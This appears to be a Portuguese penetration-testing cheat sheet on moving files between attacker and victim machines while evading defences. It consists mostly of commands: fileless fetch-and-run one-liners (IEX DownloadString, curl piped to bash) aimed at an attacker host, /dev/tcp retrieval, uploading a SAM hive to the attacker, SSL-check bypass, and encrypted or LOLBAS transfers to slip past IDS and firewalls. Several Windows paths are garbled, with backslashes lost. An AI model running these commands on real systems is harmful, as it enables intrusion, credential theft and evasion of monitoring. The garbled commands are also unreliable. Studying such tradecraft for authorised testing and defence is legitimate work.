# File Transfers & Evasion Techniques

A transferência de arquivos entre a máquina do atacante e os sistemas da vítima é uma necessidade constante em testes de invasão e auditorias de segurança.

---

## Conceitos Iniciais & Evasão
- **WDAC (Windows Defender Application Control) & AppLocker:** Restrições de execução que bloqueiam binários não assinados.
- **SeImpersonatePrivilege:** Privilégio que permite representar tokens de outros usuários (usado em utilitários como [[PrintSpoofer]]).
- **Certutil:** Binário nativo do Windows usado para download e decodificação Base64.

---

## Operações de Download em Windows

### 1. Codificação e Decodificação Base64
Transfere pequenos scripts ou binários via terminal de texto puro sem acionar inspeção de arquivo:
- **Codificar no Linux (Atacante):**
```bash
cat payload.exe | base64 -w 0 > payload.b64
```
- **Decodificar no Windows (Alvo):**
```cmd
certutil -decode payload.b64 payload.exe
```
ou em PowerShell:
```powershell
[IO.File]::WriteAllBytes("C:WindowsTaskspayload.exe", [Convert]::FromBase64String((Get-Content -Path payload.b64)))
```

### 2. PowerShell WebClient & Invoke-WebRequest
- **DownloadFile:**
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/tool.exe', 'C:WindowsTasks	ool.exe')
```
- **Execução Direta em Memória (Fileless - IEX / DownloadString):**
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')
```
- **Invoke-WebRequest (iwr):**
```powershell
Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/nc.exe' -OutFile 'C:WindowsTasks
c.exe' -UseBasicParsing
```
- **Bypass de Erro de Certificado SSL:**
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### 3. Compartilhamento SMB
- **Iniciar servidor SMB no Linux:**
```bash
impacket-smbserver share . -smb2support -user test -password test
```
- **Copiar arquivo no Windows:**
```cmd
net use z: \<ATTACKER_IP>share /user:test test
copy z:
c.exe C:WindowsTasks
c.exe
```

### 4. FTP
- **Servidor FTP no Linux:**
```bash
python3 -m pyftpdlib -p 21 -w
```
- **Script de comando FTP no Windows:**
```cmd
echo open <ATTACKER_IP> 21 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get tool.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt
```

---

## Operações de Upload em Windows
- **Servidor Python de Upload:**
```bash
python3 -m uploadserver 8000
```
- **Upload via PowerShell (PSUpload.ps1):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PSUpload.ps1')
Invoke-FileUpload -Uri 'http://<ATTACKER_IP>:8000/upload' -File 'C:UsersPublicsam.hive'
```
- **WebDAV:** Usar servidores `wsgidav` ou `cheroot` e acessar via caminho UNC `\\<ATTACKER_IP>@80DavWWWRoot\file.txt`.

---

## Operações de Transferência em Linux

### Downloads Rápidos
- **wget & curl:**
```bash
wget http://<ATTACKER_IP>/exploit.py -O /tmp/exploit.py
curl -o /tmp/exploit.py http://<ATTACKER_IP>/exploit.py
```
- **Execução Fileless em Linux:**
```bash
curl -s http://<ATTACKER_IP>/script.sh | bash
```
- **Utilizando /dev/tcp nativo do Bash:**
```bash
exec 3<>/dev/tcp/<ATTACKER_IP>/80
echo -e "GET /payload HTTP/1.1
Host: <ATTACKER_IP>

" >&3
cat <&3 > payload
```
- **SCP (Secure Copy Protocol):**
```bash
scp user@<ATTACKER_IP>:/path/file /tmp/file
```

---

## Transferência Baseada em Linguagens de Programação
- **Python:**
```python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<ATTACKER_IP>/file", "/tmp/file")'
```
- **PHP:**
```php
php -r 'file_put_contents("/tmp/file", file_get_contents("http://<ATTACKER_IP>/file"));'
```
- **Ruby:**
```ruby
ruby -e 'require "open-uri"; File.open("/tmp/file", "wb") { |f| f.write(URI.open("http://<ATTACKER_IP>/file").read) }'
```
- **Perl:**
```perl
perl -e 'use LWP::Simple; getstore("http://<ATTACKER_IP>/file", "/tmp/file");'
```

---

## Transferência com Netcat & Ncat
- **Receptor (no destino):**
```bash
nc -l -p 1234 > arquivo_recebido
```
- **Emissor (na origem):**
```bash
nc -w 3 <DESTINO_IP> 1234 < arquivo_enviar
```

---

## Redirecionamento de Disco em RDP & PSSession
- **xfreerdp com compartilhamento de pasta local:**
```bash
xfreerdp /v:<TARGET_IP> /u:administrator /p:Password123 /drive:share,/tmp/my_tools
```
- **PowerShell Remoting (PSSession):**
```powershell
$s = New-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Copy-Item -Path 'C:	ools
c.exe' -Destination 'C:UsersPublic' -ToSession $s
```

---

## Transferências Criptografadas
Evita inspeção por IDS/IPS de rede:
- **OpenSSL AES-256 no Linux:**
```bash
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k SecretKey
openssl enc -d -aes-256-cbc -in file.enc -out file.txt -k SecretKey
```
- **Invoke-AESEncryption em PowerShell:** Criptografia simétrica em scripts.

---

## Living Off The Land (LOLBAS & GTFOBins)
Uso de utilitários legítimos do SO para realizar transferências e bypassar controles:
- **LOLBAS (Windows):** `Certreq.exe`, `BitsAdmin.exe`, `Certutil.exe`, `Esentutl.exe`.
- **GTFOBins (Linux):** Executar downloads via `curl`, `wget`, `gdb`, `python`, `tcpdump`.
- **User-Agent Evasion:** Alterar o cabeçalho `User-Agent` para simular navegadores legítimos (ex: `Mozilla/5.0 Windows NT 10.0`) e evitar bloqueios por regras simples de firewall.

---
*Notas relacionadas:* [[Shells & Payloads]], [[Footprinting]], [[Pivoting]], [[Password Attacks]]
